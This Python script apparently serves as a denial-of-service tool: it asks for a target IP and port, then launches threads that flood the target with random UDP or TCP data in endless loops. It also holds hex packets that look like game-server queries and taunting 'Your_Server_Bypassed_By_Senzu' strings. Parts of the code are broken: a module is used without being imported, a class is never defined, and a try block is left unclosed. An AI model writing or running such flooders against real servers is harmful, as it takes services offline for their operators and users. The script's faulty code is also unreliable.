import random
import socket
import threading
import time
Pacotes = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]

referers = [
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu'
     'Your_Server_Bypassed_By_Senzu'
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu',
     'Your_Server_Bypassed_By_Senzu'
     'Your_Server_Bypassed_By_Senzu']


print("""\033[1;31;40m


  ██████ ▓█████  ███▄    █ ▒███████▒ █    ██   ██████  ▒█████   ███▄ ▄███▓▓█████▄▄▄█████▓ ██░ ██  ██▓ ███▄    █   ▄████    
▒██    ▒ ▓█   ▀  ██ ▀█   █ ▒ ▒ ▒ ▄▀░ ██  ▓██▒▒██    ▒ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█   ▀▓  ██▒ ▓▒▓██░ ██▒▓██▒ ██ ▀█   █  ██▒ ▀█▒   
░ ▓██▄   ▒███   ▓██  ▀█ ██▒░ ▒ ▄▀▒░ ▓██  ▒██░░ ▓██▄   ▒██░  ██▒▓██    ▓██░▒███  ▒ ▓██░ ▒░▒██▀▀██░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░   
  ▒   ██▒▒▓█  ▄ ▓██▒  ▐▌██▒  ▄▀▒   ░▓▓█  ░██░  ▒   ██▒▒██   ██░▒██    ▒██ ▒▓█  ▄░ ▓██▓ ░ ░▓█ ░██ ░██░▓██▒  ▐▌██▒░▓█  ██▓   
▒██████▒▒░▒████▒▒██░   ▓██░▒███████▒▒▒█████▓ ▒██████▒▒░ ████▓▒░▒██▒   ░██▒░▒████▒ ▒██▒ ░ ░▓█▒░██▓░██░▒██░   ▓██░░▒▓███▀▒   
▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒░   ▒ ▒ ░▒▒ ▓░▒░▒░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ░  ░░░ ▒░ ░ ▒ ░░    ▒ ░░▒░▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒    
░ ░▒  ░ ░ ░ ░  ░░ ░░   ░ ▒░░░▒ ▒ ░ ▒░░▒░ ░ ░ ░ ░▒  ░ ░  ░ ▒ ▒░ ░  ░      ░ ░ ░  ░   ░     ▒ ░▒░ ░ ▒ ░░ ░░   ░ ▒░  ░   ░    
░  ░  ░     ░      ░   ░ ░ ░ ░ ░ ░ ░ ░░░ ░ ░ ░  ░  ░  ░ ░ ░ ▒  ░      ░      ░    ░       ░  ░░ ░ ▒ ░   ░   ░ ░ ░ ░   ░    
      ░     ░  ░         ░   ░ ░       ░           ░      ░ ░         ░      ░  ░         ░  ░  ░ ░           ░       ░    
                           ░                                                                                               
""")

print("033\35m           ╔════════════════════════╗") 
print("033\35m           ║\033[32m TOOLS BY SENZU \033[31m ║") 
print("033\35m           ╚════════════════════════╝") 
ip = str(input("\033[94m Ip \033[1;31;40m  ====> : "))
port = int(input(" \033[94mPort \033[1;31;40m====> : "))
choice = str(input(" \033[94mMetods \033[1;31;40m     ====> : "))
times = int(input(" \033[94mPakets \033[1;31;40m      ====> : "))
threads = int(input("\033[94m Threads \033[1;31;40m    ====> : "))

def udp():
	data = random._urandom(1081)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f"[×] Senzu 攻撃 {ip} port {port}")
		except:
			print(f"[#] Senzu હુમલો {ip} port {port}")

def tcp():
	data = random._urandom(666)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(f"[¥] Senzu आक्रमण  {ip} port {port}")
		except:
			s.close()
			print(f"[✓] Senzu จู่โจม  {ip} port {port}")

if __name__ == '__main__':
    try:
        for x in range(500):
            mythread = MyThread()
            mythread.start()
            time.sleep(.1)
            
for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = udp)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = tcp)
        th.start()
